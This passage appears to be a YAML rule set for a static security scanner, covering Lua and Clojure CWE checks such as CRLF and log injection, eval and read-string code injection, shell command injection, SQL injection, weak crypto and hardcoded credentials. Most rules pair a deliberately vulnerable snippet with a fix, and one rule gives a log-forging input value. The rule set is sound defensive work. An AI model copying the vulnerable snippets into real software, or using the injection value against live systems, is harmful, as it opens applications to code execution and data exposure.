rule:
  kind: pattern
  pattern: 'for\s+\w+\s+in\s+\w+\(\)

    '
note: "Generators from untrusted sources may never terminate.\n\nVulnerable pattern:\n\
  \  for value in gen() do\n      process(value)  -- May never end\n  end\n\nRemediation:\n\
  - Add iteration limits\n- Implement timeouts\n- Count iterations\n- Use safe generator\
  \ patterns\n"
---
id: lua-cwe-93-crlf-injection-headers
language: lua
severity: warning
message: 'CWE-93: CRLF characters in headers enable header injection'
tags:
- security
- header-injection
- CWE-93
rule:
  kind: pattern
  pattern: Content-Type.*user|header.*user|user.*header
note: "CRLF characters can inject additional HTTP headers.\n\nVulnerable pattern:\n\
  \  local header = \"Content-Type: \" .. user_content_type\n\nRemediation:\n- Strip\
  \ or reject \\r and \\n from header values\n- Use header builders that escape automatically\n\
  - Validate header values against whitelist\n"
---
id: lua-cwe-117-log-injection
language: lua
severity: info
message: 'CWE-117: Newlines in logs can forge log entries'
tags:
- security
- log-injection
- CWE-117
rule:
  kind: function_call
  pattern: 'log\(.*user|log\(.*input

    '
note: "Newlines in user input can forge log entries.\n\nVulnerable pattern:\n  log(\"\
  User login: \" .. username)\n  -- If username = \"admin\\n[ALERT] Security breach\"\
  \n\nRemediation:\n- Escape or encode user input in logs\n- Strip newlines and control\
  \ characters\n- Use structured logging\n- Validate log format\n"
---
id: lua-cwe-601-unvalidated-redirect
language: lua
severity: warning
message: 'CWE-601: Open redirect with user-controlled destination for phishing'
tags:
- security
- open-redirect
- CWE-601
rule:
  kind: pattern
  pattern: 'redirect\(.*url|response\.redirect\(.*user

    '
note: "Open redirects can be used for phishing attacks.\n\nVulnerable pattern:\n \
  \ local redirect_url = request.params.url\n  response.redirect(redirect_url)\n\n\
  Remediation:\n- Validate redirect URLs against whitelist\n- Reject external domains\n\
  - Use safe redirect APIs\n- Log redirects for monitoring\n"
---
id: lua-cwe-209-error-message-information-leak
language: lua
severity: warning
message: 'CWE-209: Error messages may contain sensitive data exposed to users'
tags:
- security
- information-disclosure
- CWE-209
rule:
  kind: function_call
  pattern: 'error\(.*connection|error\(.*password|error\(.*secret

    '
note: "Error messages may expose sensitive data.\n\nVulnerable pattern:\n  error(\"\
  DB connection failed: \" .. connection_string)\n\nRemediation:\n- Log details internally\n\
  - Return generic error messages to users\n- Don't include secrets/connections/internal\
  \ data in errors\n- Use error codes instead of detailed messages\n"
---
id: lua-cwe-367-toctou-file-operation
language: lua
severity: warning
message: 'CWE-367: TOCTOU race between file check and use'
tags:
- security
- race-condition
- time-of-check-time-of-use
- CWE-367
rule:
  kind: pattern
  pattern: 'if\s+.*_exists.*then.*open

    '
note: "TOCTOU race between check and use can cause file to change between operations.\n\
  \nVulnerable pattern:\n  if file_exists(path) then\n      local f = io.open(path)\
  \  -- File might be changed\n  end\n\nRemediation:\n- Handle open failures\n- Use\
  \ atomic operations\n- Try open directly rather than checking first\n- Use proper\
  \ error handling\n"
---
id: lua-cwe-526-environment-variable-injection
language: lua
severity: warning
message: 'CWE-526: User-controlled environment variable names leak sensitive env vars'
tags:
- security
- sensitive-information
- CWE-526
rule:
  kind: function_call
  pattern: 'os\.getenv\([^)]*user|os\.getenv\([^)]*input

    '
note: "User-controlled variable names can access sensitive environment variables.\n\
  \nVulnerable pattern:\n  local value = os.getenv(user_var_name)  -- Could be AWS_SECRET_KEY\n\
  \nRemediation:\n- Whitelist allowed environment variable names\n- Never use user\
  \ input as variable name\n- Validate against hardcoded list\n- Log access attempts\n"
---
id: lua-cwe-276-insecure-default-permissions
language: lua
severity: warning
message: 'CWE-276: File creation without explicit permissions may be world-readable'
tags:
- security
- permission
- CWE-276
rule:
  kind: function_call
  pattern: 'io\.open\([^)]*["\''][wWaA]["\''][^)]*\)

    '
note: "Default file permissions may be too permissive.\n\nVulnerable pattern:\n  local\
  \ f = io.open(\"secrets.txt\", \"w\")\n  f:write(secret_data)\n\nRemediation:\n\
  - Set restrictive permissions after creation\n- Use platform-specific APIs to control\
  \ permissions\n- Validate file permissions\n- Test with permission analysis tools\n"
---
id: lua-cwe-1321-prototype-pollution-table-merge
language: lua
severity: warning
message: 'CWE-1321: Deep table merge with user keys enables prototype pollution'
tags:
- security
- prototype-pollution
- CWE-1321
rule:
  kind: pattern
  pattern: deep_merge|table.*merge
note: "User-controlled table keys in merge operations can inject metatable keys.\n\
  \nVulnerable pattern:\n  function deep_merge(target, source)\n      for k, v in\
  \ pairs(source) do\n          target[k] = v  -- User could inject __index\n    \
  \  end\n  end\n\nRemediation:\n- Skip metatable-related keys\n- Validate key names\n\
  - Use whitelist of allowed keys\n- Test with special key names\n"
---
id: lua-cwe-20-integer-parsing-edge-cases
language: lua
severity: info
message: 'CWE-20: tonumber() edge cases (inf, nan, overflow) need handling'
tags:
- security
- input-validation
- CWE-20
rule:
  kind: function_call
  pattern: 'tonumber\(

    '
note: "tonumber can return unexpected results for edge cases.\n\nVulnerable patterns:\n\
  \  tonumber(\"inf\")   -- Returns inf\n  tonumber(\"nan\")   -- Returns nan\n  tonumber(\"\
  -0\")    -- Returns -0\n  tonumber(\"1e999\") -- Returns inf\n\nRemediation:\n-\
  \ Check for inf/nan after conversion\n- Validate against acceptable ranges\n- Use\
  \ type checking\n- Test edge cases\n"
---
id: lua-cwe-176-unicode-bypass
language: lua
severity: warning
message: 'CWE-176: String validation ignoring Unicode can bypass ASCII-only checks'
tags:
- security
- unicode
- validation-bypass
- CWE-176
rule:
  kind: pattern
  pattern: 'string\.find.*[<>&\]]

    '
note: "Unicode characters may bypass ASCII-focused validation (e.g., ＜ ＞ ＆).\n\nVulnerable\
  \ pattern:\n  if string.find(input, \"[<>&]\") then\n      error(\"Invalid characters\"\
  )\n  end\n  -- Unicode equivalents might pass\n\nRemediation:\n- Normalize Unicode\
  \ input (NFD/NFC)\n- Use Unicode-aware validation\n- Test with Unicode lookalikes\n\
  - Consider allowlist approach\n"
---
id: clojure-cwe-95-eval-code-injection
language: clojure
severity: error
message: 'CWE-95: Dangerous eval usage - executes arbitrary Clojure code at runtime'
tags:
- security
- code-injection
- CWE-95
- OWASP-CodeInjection
rule:
  kind: function_call
  pattern: (eval ...)
note: 'eval executes arbitrary Clojure code at runtime. If user input reaches eval,
  it enables

  remote code execution (RCE). Avoid eval entirely. Use data-driven approaches, multimethods,

  or protocols instead.


  BAD:  (eval (read-string user-input))

  GOOD: (case user-action :add (add-item data) :remove (remove-item data))

  '
---
id: clojure-cwe-502-read-string-unsafe
language: clojure
severity: error
message: 'CWE-502: read-string without EDN - can instantiate arbitrary Java objects'
tags:
- security
- deserialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: function_call
  pattern: (read-string ...)
note: 'read-string can instantiate arbitrary Java objects via reader macros like #=.
  Use

  clojure.edn/read-string for untrusted input instead. This prevents dangerous object

  instantiation during deserialization.


  BAD:  (read-string user-data)

  GOOD: (clojure.edn/read-string user-data)

  '
---
id: clojure-cwe-502-read-no-eval-binding
language: clojure
severity: error
message: 'CWE-502: read without *read-eval* false binding - default evaluates #=()
  forms'
tags:
- security
- deserialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: function_call
  pattern: (read ...)
note: 'The read function evaluates #=() forms by default. Must bind *read-eval* to
  false or use

  clojure.edn/read. This prevents RCE through reader evaluation.


  BAD:  (read (io/reader file))

  GOOD: (binding [*read-eval* false] (read (io/reader file)))

  BEST: (clojure.edn/read (io/reader file))

  '
---
id: clojure-cwe-95-load-string-arbitrary
language: clojure
severity: error
message: 'CWE-95: load-string compiles and executes arbitrary Clojure source code'
tags:
- security
- code-injection
- CWE-95
- OWASP-CodeInjection
rule:
  kind: function_call
  pattern: (load-string ...)
note: 'load-string compiles and executes Clojure source code. Never use with untrusted
  input.

  Use configuration files or data structures instead.


  BAD:  (load-string (slurp config-file))

  GOOD: (clojure.edn/read-string (slurp config-file))

  '
---
id: clojure-cwe-94-load-file-dynamic-path
language: clojure
severity: warning
message: 'CWE-94: load-file with dynamic path can lead to arbitrary code execution'
tags:
- security
- code-injection
- CWE-94
rule:
  kind: function_call
  pattern: (load-file variable)
note: "Loading files from dynamic paths can lead to arbitrary code execution if path\
  \ is\nuser-controlled. Use allowlist of permitted files. Validate paths against\
  \ known safe\nlocations.\n\nBAD:  (load-file (str plugin-dir \"/\" user-plugin))\n\
  GOOD: (let [allowed #{\"plugin-a.clj\" \"plugin-b.clj\"}]\n       (when (allowed\
  \ user-plugin)\n         (load-file (str plugin-dir \"/\" user-plugin))))\n"
---
id: clojure-cwe-470-resolve-dynamic-symbol
language: clojure
severity: warning
message: 'CWE-470: Dynamic symbol resolution can expose internal functions'
tags:
- security
- reflection
- CWE-470
rule:
  kind: function_call
  pattern: (resolve (symbol ...))||(ns-resolve ... (symbol ...))
note: "Dynamic symbol resolution can expose internal functions if symbol name comes\
  \ from user\ninput. Use allowlist of permitted symbols/functions.\n\nBAD:  ((resolve\
  \ (symbol user-fn-name)) args)\nGOOD: (let [allowed-fns {'add add-fn 'remove remove-fn}]\n\
  \       (when-let [f (allowed-fns (symbol user-fn-name))]\n         (f args)))\n"
---
id: clojure-cwe-913-intern-dynamic-creation
language: clojure
severity: warning
message: 'CWE-913: intern can create or modify vars dynamically, risking function
  overwrite'
tags:
- security
- dynamic-code
- CWE-913
rule:
  kind: function_call
  pattern: (intern ns name value)
note: 'intern can create or modify vars dynamically. If namespace/name comes from
  user input,

  can overwrite critical functions. Only use intern with hardcoded namespaces and
  names.

  '
---
id: clojure-cwe-95-macro-unsanitized-input
language: clojure
severity: warning
message: 'CWE-95: Macros with unsanitized input can introduce code injection vulnerabilities'
tags:
- security
- code-injection
- CWE-95
rule:
  kind: macro_definition
  pattern: defmacro.*external.*input
note: "Macros execute at compile time. If they generate code from external input,\
  \ they can\nintroduce vulnerabilities. Validate all inputs in macros. Prefer functions\
  \ over macros\nwhen possible.\n\nBAD:  (defmacro run-query [table] `(query ~(str\
  \ \"SELECT * FROM \" table)))\nGOOD: (defn run-query [table]\n       (when (valid-table?\
  \ table)\n         (query (str \"SELECT * FROM \" (sanitize table)))))\n"
---
id: clojure-cwe-78-processbuilder-command-injection
language: clojure
severity: error
message: 'CWE-78: ProcessBuilder with user input enables OS command injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-OSCommandInjection
rule:
  kind: method_call
  pattern: (ProcessBuilder. ...)|(.start.*ProcessBuilder)
note: "ProcessBuilder executes system commands. User input in command or arguments\
  \ leads to\ncommand injection. Avoid shell execution. If necessary, use allowlist\
  \ of commands and\nvalidate/sanitize arguments.\n\nBAD:  (.start (ProcessBuilder.\
  \ [\"sh\" \"-c\" user-command]))\nGOOD: (let [allowed #{\"ls\" \"pwd\"}]\n     \
  \  (when (allowed command)\n         (.start (ProcessBuilder. [command]))))\n"
---
id: clojure-cwe-78-runtime-exec-command-injection
language: clojure
severity: error
message: 'CWE-78: Runtime.exec directly executes system commands - high injection
  risk'
tags:
- security
- command-injection
- CWE-78
- OWASP-OSCommandInjection
rule:
  kind: method_call
  pattern: (.exec (Runtime/getRuntime) ...)
note: 'Directly executes system commands. High risk of command injection. Use ProcessBuilder

  with explicit argument arrays. Never concatenate user input into commands.


  BAD:  (.exec (Runtime/getRuntime) (str "grep " user-pattern " file.txt"))

  GOOD: (ProcessBuilder. ["grep" "-F" user-pattern "file.txt"])

  '
---
id: clojure-cwe-78-clojure-shell-injection
language: clojure
severity: error
message: 'CWE-78: clojure.java.shell/sh with string concatenation enables injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-OSCommandInjection
rule:
  kind: function_call
  pattern: (sh ...).*string.*concat
note: 'clojure.java.shell/sh executes commands. String concatenation in arguments
  enables

  injection. Pass arguments as separate strings, not concatenated. Validate inputs.


  BAD:  (sh "sh" "-c" (str "cat " user-file))

  GOOD: (sh "cat" user-file) ; still validate user-file is safe path

  '
---
id: clojure-cwe-470-unsafe-class-loading
language: clojure
severity: warning
message: 'CWE-470: Dynamic class loading can instantiate arbitrary dangerous classes'
tags:
- security
- reflection
- CWE-470
rule:
  kind: function_call
  pattern: (Class/forName ...)
note: "Dynamic class loading can instantiate arbitrary classes, potentially dangerous\
  \ ones.\nUse allowlist of permitted class names.\n\nBAD:  (Class/forName user-class-name)\n\
  GOOD: (let [allowed #{\"com.example.SafeClass\"}]\n       (when (allowed user-class-name)\n\
  \         (Class/forName user-class-name)))\n"
---
id: clojure-cwe-470-constructor-dynamic-invocation
language: clojure
severity: warning
message: 'CWE-470: Dynamic constructor invocation can create dangerous object instances'
tags:
- security
- reflection
- CWE-470
rule:
  kind: method_call
  pattern: (.newInstance ...)||(Reflector/invokeConstructor ...)
note: 'Creating instances of dynamically-specified classes can instantiate dangerous
  objects.

  Use factory functions with allowlisted types.

  '
---
id: clojure-cwe-470-method-invocation-reflection
language: clojure
severity: warning
message: 'CWE-470: Reflective method invocation can bypass access controls'
tags:
- security
- reflection
- CWE-470
rule:
  kind: method_call
  pattern: (.invoke method ...)
note: 'Reflective method invocation can bypass access controls and execute arbitrary
  methods.

  Prefer direct method calls. Validate method names against allowlist.

  '
---
id: clojure-cwe-94-script-engine-unsafe
language: clojure
severity: error
message: 'CWE-94: ScriptEngine.eval with user input enables RCE in JavaScript/Groovy'
tags:
- security
- code-injection
- CWE-94
- OWASP-CodeInjection
rule:
  kind: method_call
  pattern: (ScriptEngineManager.)|(.eval.*ScriptEngine)
note: "ScriptEngine can execute JavaScript, Groovy, or other languages. User input\
  \ leads to RCE.\nAvoid ScriptEngine with user input. Use sandboxed evaluation if\
  \ necessary.\n\nBAD: (let [engine (.getEngineByName (ScriptEngineManager.) \"JavaScript\"\
  )]\n      (.eval engine user-script))\n"
---
id: clojure-cwe-94-jndi-injection
language: clojure
severity: error
message: 'CWE-94: JNDI lookup with user input enables RCE (Log4Shell-style attacks)'
tags:
- security
- code-injection
- CWE-94
- OWASP-CodeInjection
rule:
  kind: method_call
  pattern: (.lookup (InitialContext.) ...)
note: 'JNDI lookups with user-controlled input can lead to RCE (Log4Shell-style attacks).

  Never use user input in JNDI lookups. Disable remote class loading.


  BAD: (.lookup (InitialContext.) user-jndi-name)

  '
---
id: clojure-cwe-89-sql-string-concatenation
language: clojure
severity: error
message: 'CWE-89: String concatenation in SQL enables injection attacks'
tags:
- security
- sql-injection
- CWE-89
- OWASP-SQLInjection
rule:
  kind: function_call
  pattern: (str.*SELECT|format.*SELECT)
note: 'Concatenating user input into SQL strings enables SQL injection. Use parameterized

  queries with next.jdbc or HoneySQL.


  BAD:  (jdbc/execute! ds [(str "SELECT * FROM users WHERE id = " user-id)])

  GOOD: (jdbc/execute! ds ["SELECT * FROM users WHERE id = ?" user-id])

  '
---
id: clojure-cwe-89-sql-format-interpolation
language: clojure
severity: error
message: 'CWE-89: format interpolation in SQL is equivalent to string concatenation'
tags:
- security
- sql-injection
- CWE-89
- OWASP-SQLInjection
rule:
  kind: function_call
  pattern: (format.*SELECT)
note: 'format interpolation in SQL is equivalent to string concatenation - vulnerable
  to

  injection. Use parameterized queries.


  BAD:  (jdbc/execute! ds [(format "SELECT * FROM %s WHERE id = %s" table user-id)])

  GOOD: (jdbc/execute! ds ["SELECT * FROM users WHERE id = ?" user-id])

  '
---
id: clojure-cwe-89-honeysql-raw-injection
language: clojure
severity: warning
message: 'CWE-89: HoneySQL raw/inline bypasses parameterization'
tags:
- security
- sql-injection
- CWE-89
- OWASP-SQLInjection
rule:
  kind: function_call
  pattern: (sql/raw ...)||([:raw ...])
note: 'raw bypasses HoneySQL''s parameterization. User input in raw leads to injection.

  Use HoneySQL''s built-in operators. Avoid raw with any external input.


  BAD:  (sql/format {:select [:*] :from [:users] :where (sql/raw (str "id = " user-id))})

  GOOD: (sql/format {:select [:*] :from [:users] :where [:= :id user-id]})

  '
---
id: clojure-cwe-89-sql-dynamic-identifiers
language: clojure
severity: warning
message: 'CWE-89: Dynamic table/column names without validation enables injection'
tags:
- security
- sql-injection
- CWE-89
- OWASP-SQLInjection
rule:
  kind: variable_usage
  pattern: Dynamic identifiers in SQL
note: "Table/column names can't be parameterized. Must validate against allowlist.\n\
  Maintain allowlist of valid table/column names. Use identifier quoting.\n\nBAD:\
  \  (sql/format {:select [:*] :from [(keyword user-table)]})\nGOOD: (let [allowed-tables\
  \ #{:users :products :orders}]\n       (when (allowed-tables (keyword user-table))\n\
  \         (sql/format {:select [:*] :from [(keyword user-table)]})))\n"
---
id: clojure-cwe-89-sql-order-by-injection
language: clojure
severity: warning
message: 'CWE-89: Dynamic ORDER BY clause construction can leak data'
tags:
- security
- sql-injection
- CWE-89
rule:
  kind: variable_usage
  pattern: Dynamic ORDER BY
note: 'ORDER BY injection can leak data through boolean inference attacks. Validate
  sort

  columns against allowlist.

  '
---
id: clojure-cwe-89-sql-like-wildcards
language: clojure
severity: info
message: 'CWE-89: Unescaped LIKE clause wildcards can cause DoS or unintended matches'
tags:
- security
- sql-injection
- CWE-89
rule:
  kind: string_usage
  pattern: LIKE.*user.*input
note: "Unescaped % and _ in LIKE patterns can cause DoS or unintended matches. Escape\
  \ LIKE\nwildcards in user input.\n\nBAD:  (sql/format {:where [:like :name (str\
  \ \"%\" user-search \"%\")]})\nGOOD: (defn escape-like [s]\n       (-> s (str/replace\
  \ \"%\" \"\\\\%\") (str/replace \"_\" \"\\\\_\")))\n       (sql/format {:where [:like\
  \ :name (str \"%\" (escape-like user-search) \"%\")]})\n"
---
id: clojure-cwe-352-csrf-missing-protection
language: clojure
severity: warning
message: 'CWE-352: POST/PUT/DELETE routes without CSRF token validation'
tags:
- security
- csrf
- CWE-352
- OWASP-CSRF
rule:
  kind: route_definition
  pattern: (POST|PUT|DELETE).*routes
note: 'Without CSRF protection, attackers can forge requests from authenticated users.

  Use ring-anti-forgery middleware.


  BAD:  (defroutes app-routes (POST "/transfer" [amount to] (transfer! amount to)))

  GOOD: (def app (-> app-routes wrap-anti-forgery wrap-session))

  '
---
id: clojure-cwe-434-missing-content-type
language: clojure
severity: warning
message: 'CWE-434: Missing Content-Type header enables MIME sniffing attacks'
tags:
- security
- mime-sniffing
- CWE-434
rule:
  kind: response_definition
  pattern: response.*without.*Content-Type
note: 'Missing Content-Type can lead to MIME sniffing attacks. Always set Content-Type
  header.

  Use wrap-content-type middleware.

  '
---
id: clojure-cwe-79-xss-unescaped-output
language: clojure
severity: warning
message: 'CWE-79: User input rendered without HTML escaping enables XSS'
tags:
- security
- xss
- CWE-79
- OWASP-XSS
rule:
  kind: template_rendering
  pattern: render.*user.*raw
note: 'Unescaped user input in HTML responses enables Cross-Site Scripting. Use templating

  engines with auto-escaping (Hiccup escapes by default). Never use raw-string.


  BAD:  (selmer/render-file "template.html" {:name (raw user-name)})

  GOOD: [:div.username user-name]

  '
---
id: clojure-cwe-601-open-redirect
language: clojure
severity: warning
message: 'CWE-601: Redirect to user-provided URL without validation enables phishing'
tags:
- security
- open-redirect
- CWE-601
rule:
  kind: function_call
  pattern: (response/redirect user-url)
note: "Open redirects enable phishing attacks using legitimate domain. Validate redirect\
  \ URLs\nagainst allowlist or ensure relative paths only.\n\nBAD:  (response/redirect\
  \ user-url)\nGOOD: (defn safe-redirect [url]\n       (if (or (str/starts-with? url\
  \ \"/\") (str/starts-with? url \"https://example.com\"))\n         (response/redirect\
  \ url)\n         (response/redirect \"/\")))\n"
---
id: clojure-cwe-693-missing-security-headers
language: clojure
severity: warning
message: 'CWE-693: Missing security headers expose to clickjacking and MIME sniffing'
tags:
- security
- security-headers
- CWE-693
rule:
  kind: middleware_chain
  pattern: response.*without.*security.*headers
note: 'Missing security headers (X-Frame-Options, X-Content-Type-Options, etc.) expose

  application to clickjacking, MIME sniffing, etc. Use ring-secure-headers or configure

  headers manually.


  GOOD: (def app (-> handler (wrap-defaults site-defaults) wrap-content-type wrap-not-modified))

  '
---
id: clojure-cwe-614-cookie-missing-secure
language: clojure
severity: warning
message: 'CWE-614: Cookies without Secure flag are sent over HTTP'
tags:
- security
- cookie-security
- CWE-614
rule:
  kind: cookie_assignment
  pattern: cookies.*without.*:secure
note: 'Cookies without Secure flag are sent over HTTP, exposing them to interception.

  Set :secure true for all sensitive cookies in production.


  BAD:  (assoc-in response [:cookies "session"] {:value session-id})

  GOOD: (assoc-in response [:cookies "session"] {:value session-id :secure true :http-only
  true})

  '
---
id: clojure-cwe-1004-cookie-missing-httponly
language: clojure
severity: warning
message: 'CWE-1004: Cookies without HttpOnly flag accessible to JavaScript'
tags:
- security
- cookie-security
- CWE-1004
rule:
  kind: cookie_assignment
  pattern: cookies.*without.*:http-only
note: 'Cookies without HttpOnly can be accessed by JavaScript, enabling session theft
  via XSS.

  Set :http-only true for session cookies.

  '
---
id: clojure-cwe-384-session-fixation
language: clojure
severity: warning
message: 'CWE-384: Reusing session ID after login enables session fixation attacks'
tags:
- security
- session-management
- CWE-384
rule:
  kind: authentication_handler
  pattern: authentication.*without.*session.*regeneration
note: 'Reusing session ID after login enables session fixation attacks. Regenerate
  session ID

  after authentication state changes.

  '
---
id: clojure-cwe-22-path-traversal-file-serving
language: clojure
severity: warning
message: 'CWE-22: User-controlled paths without validation enables directory escape'
tags:
- security
- path-traversal
- CWE-22
rule:
  kind: file_operation
  pattern: (io/file base-dir user-path)
note: "User-controlled paths with .. can escape intended directory. Normalize paths\
  \ and\nvalidate they remain within base directory.\n\nBAD:  (slurp (io/file upload-dir\
  \ user-filename))\nGOOD: (defn safe-path [base-dir filename]\n       (let [base\
  \ (-> base-dir io/file .getCanonicalPath)\n             full (-> (io/file base-dir\
  \ filename) .getCanonicalPath)]\n         (when (str/starts-with? full base) full)))\n"
---
id: clojure-cwe-942-cors-misconfiguration
language: clojure
severity: warning
message: 'CWE-942: Overly permissive CORS allows any website to make authenticated
  requests'
tags:
- security
- cors
- CWE-942
rule:
  kind: header_assignment
  pattern: Access-Control-Allow-Origin.*\*|Access-Control-Allow-Origin.*Origin
note: 'Access-Control-Allow-Origin: * or reflecting Origin header enables CORS attacks.

  Use specific allowed origins. Never reflect Origin header with credentials.

  '
---
id: clojure-cwe-502-java-serialization
language: clojure
severity: error
message: 'CWE-502: Java deserialization of untrusted data leads to RCE'
tags:
- security
- deserialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: class_usage
  pattern: (ObjectInputStream. ...)|(.readObject ...)
note: 'Java deserialization of untrusted data leads to RCE via gadget chains. Avoid
  Java

  serialization. Use EDN, JSON, or Transit.


  BAD:  (with-open [ois (ObjectInputStream. input-stream)] (.readObject ois))

  GOOD: (json/parse-string (slurp input-stream))

  '
---
id: clojure-cwe-502-nippy-unencrypted
language: clojure
severity: warning
message: 'CWE-502: Nippy without encryption can execute code during deserialization'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: function_call
  pattern: (nippy/thaw ...)
note: 'Nippy can execute code during deserialization if not encrypted and signed.
  Use Nippy''s

  encryption feature for untrusted data. Better: use EDN for external data.

  '
---
id: clojure-cwe-502-transit-custom-handlers
language: clojure
severity: warning
message: 'CWE-502: Custom Transit handlers can instantiate arbitrary objects'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: handler_definition
  pattern: transit.*custom.*handler
note: 'Custom Transit handlers can instantiate arbitrary objects. Don''t use custom
  handlers

  for untrusted input. Validate tag types.

  '
---
id: clojure-cwe-502-cheshire-custom-decoders
language: clojure
severity: warning
message: 'CWE-502: Custom JSON decoders can create dangerous objects from JSON'
tags:
- security
- deserialization
- CWE-502
rule:
  kind: handler_definition
  pattern: cheshire.*custom.*decoder
note: 'Custom decoders can create dangerous objects from JSON. Validate and sanitize
  decoded

  data. Don''t instantiate arbitrary classes.

  '
---
id: clojure-cwe-321-hardcoded-crypto-keys
language: clojure
severity: error
message: 'CWE-321: Hardcoded cryptographic keys are trivially extracted'
tags:
- security
- cryptography
- CWE-321
rule:
  kind: variable_assignment
  pattern: (SecretKeySpec.*hardcoded|string.*literal.*crypto)
note: 'Hardcoded keys are extracted trivially from source/bytecode. Use environment
  variables,

  secret managers, or key derivation from user input.


  BAD:  (def secret-key (SecretKeySpec. (.getBytes "mySecretKey123!") "AES"))

  GOOD: (def secret-key (SecretKeySpec. (.getBytes (System/getenv "ENCRYPTION_KEY"))
  "AES"))

  '
---
id: clojure-cwe-328-weak-hash-md5
language: clojure
severity: warning
message: 'CWE-328: MD5 is cryptographically broken with generatable collisions'
tags:
- security
- weak-crypto
- CWE-328
rule:
  kind: method_call
  pattern: (MessageDigest/getInstance "MD5")
note: 'MD5 is cryptographically broken. Collisions can be generated. Use SHA-256 or
  SHA-3

  for checksums. Use bcrypt/argon2 for passwords.


  BAD:  (MessageDigest/getInstance "MD5")

  GOOD: (MessageDigest/getInstance "SHA-256")

  '
---
id: clojure-cwe-328-weak-hash-sha1
language: clojure
severity: warning
message: 'CWE-328: SHA-1 has known collision attacks'
tags:
- security
- weak-crypto
- CWE-328
rule:
  kind: method_call
  pattern: (MessageDigest/getInstance "SHA-1")
note: 'SHA-1 has known collision attacks. Not suitable for security purposes. Use
  SHA-256

  or better.

  '
---
id: clojure-cwe-327-ecb-mode-encryption
language: clojure
severity: warning
message: 'CWE-327: ECB mode doesn''t hide data patterns - same plaintext = same ciphertext'
tags:
- security
- weak-crypto
- CWE-327
rule:
  kind: string_literal
  pattern: AES/ECB
note: 'ECB mode doesn''t hide data patterns. Same plaintext equals same ciphertext.
  Use GCM

  (authenticated) or CBC with HMAC.


  BAD:  (Cipher/getInstance "AES/ECB/PKCS5Padding")

  GOOD: (Cipher/getInstance "AES/GCM/NoPadding")

  '
---
id: clojure-cwe-330-predictable-random
language: clojure
severity: warning
message: 'CWE-330: Standard PRNG is predictable for security purposes'
tags:
- security
- weak-crypto
- CWE-330
rule:
  kind: function_call
  pattern: (rand)|(rand-int)|(java.util.Random.)
note: "Standard PRNG is predictable. Not suitable for tokens, keys, or security values.\n\
  Use java.security.SecureRandom.\n\nBAD:  (defn generate-token [] (str (rand-int\
  \ 1000000)))\nGOOD: (defn generate-token []\n       (let [bytes (byte-array 32)\
  \ sr (java.security.SecureRandom.)]\n         (.nextBytes sr bytes)\n         (codec/bytes->hex\
  \ bytes)))\n"
---
id: clojure-cwe-329-static-iv-encryption
language: clojure
severity: warning
message: 'CWE-329: Reusing IV with same key compromises encryption security'
tags:
- security
- weak-crypto
- CWE-329
rule:
  kind: variable_assignment
  pattern: hardcoded.*IV|static.*nonce
note: 'Reusing IV with same key compromises encryption security. Generate random IV
  for

  each encryption. Store IV with ciphertext.

  '
---
id: clojure-cwe-256-plaintext-password
language: clojure
severity: error
message: 'CWE-256: Storing/comparing plain passwords is a critical vulnerability'
tags:
- security
- password-storage
- CWE-256
rule:
  kind: function_call
  pattern: (= password stored-password)
note: 'Storing/comparing plain passwords is critical. Use bcrypt, argon2, or scrypt
  for

  password hashing.


  BAD:  (defn check-password [input stored] (= input stored))

  GOOD: (defn check-password [input hashed] (hashers/verify input hashed))

  '
---
id: clojure-cwe-326-insufficient-key-length
language: clojure
severity: warning
message: 'CWE-326: Short cryptographic keys vulnerable to brute force'
tags:
- security
- weak-crypto
- CWE-326
rule:
  kind: key_generation
  pattern: RSA.*<.*2048|AES.*<.*128
note: 'Short keys are vulnerable to brute force attacks. RSA >= 2048 bits, AES >=
  128 bits

  (256 recommended).

  '
---
id: clojure-cwe-353-missing-hmac-verification
language: clojure
severity: warning
message: 'CWE-353: Decryption without MAC verification enables padding oracle attacks'
tags:
- security
- weak-crypto
- CWE-353
rule:
  kind: decryption_operation
  pattern: decrypt.*without.*verify
note: 'Without authentication, ciphertext can be modified (padding oracle attacks).
  Use AEAD

  modes (GCM, CCM) or encrypt-then-MAC.

  '
---
id: clojure-cwe-798-hardcoded-passwords
language: clojure
severity: error
message: 'CWE-798: Hardcoded passwords in source are easily extracted'
tags:
- security
- credentials
- CWE-798
rule:
  kind: variable_assignment
  pattern: :password|pwd|password
note: 'Hardcoded credentials in source are easily extracted. Use environment variables,

  secret managers, or configuration files outside repo.


  BAD:  (def db-config {:password "admin123"})

  GOOD: (def db-config {:password (System/getenv "DB_PASSWORD")})

  '
---
id: clojure-cwe-798-hardcoded-api-keys
language: clojure
severity: error
message: 'CWE-798: API keys in source get committed and leaked'
tags:
- security
- credentials
- CWE-798
rule:
  kind: variable_assignment
  pattern: :api-key|api_key|apikey|bearer.*token
note: 'API keys in source get committed to version control and leaked. Use environment

  variables or secret management systems.

  '
---
id: clojure-cwe-798-aws-credentials
language: clojure
severity: error
message: 'CWE-798: AWS credentials as string literals are frequently leaked'
tags:
- security
- credentials
- CWE-798
rule:
  kind: variable_assignment
  pattern: AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY
note: 'AWS credentials in code are frequently leaked and exploited. Use IAM roles,
  instance

  profiles, or environment variables.

  '
---
id: clojure-cwe-321-private-key-source
language: clojure
severity: error
message: 'CWE-321: Private keys in source compromise all encrypted data'
tags:
- security
- credentials
- CWE-321
rule:
  kind: text_content
  pattern: '-----BEGIN.*PRIVATE.*KEY-----'
note: 'Private keys in source compromise all encrypted data. Store keys in secure
  files

  outside repo, use key management services.

  '
---
id: clojure-cwe-532-logging-sensitive-data
language: clojure
severity: warning
message: 'CWE-532: Sensitive data in logs can be exposed to unauthorized access'
tags:
- security
- information-disclosure
- CWE-532
rule:
  kind: function_call
  pattern: (log/.*password|log/.*secret|log/.*token)
note: 'Sensitive data in logs can be exposed to unauthorized access. Mask or exclude

  sensitive fields from logging.


  BAD:  (log/info "User login" {:username user :password pass})

  GOOD: (log/info "User login" {:username user :password "[REDACTED]"})

  '
---
id: clojure-cwe-20-missing-input-validation
language: clojure
severity: warning
message: 'CWE-20: Unvalidated input leads to injection and logic errors'
tags:
- security
- input-validation
- CWE-20
rule:
  kind: parameter_usage
  pattern: request.*:params
note: "Unvalidated input leads to injection, type confusion, and logic errors. Use\n\
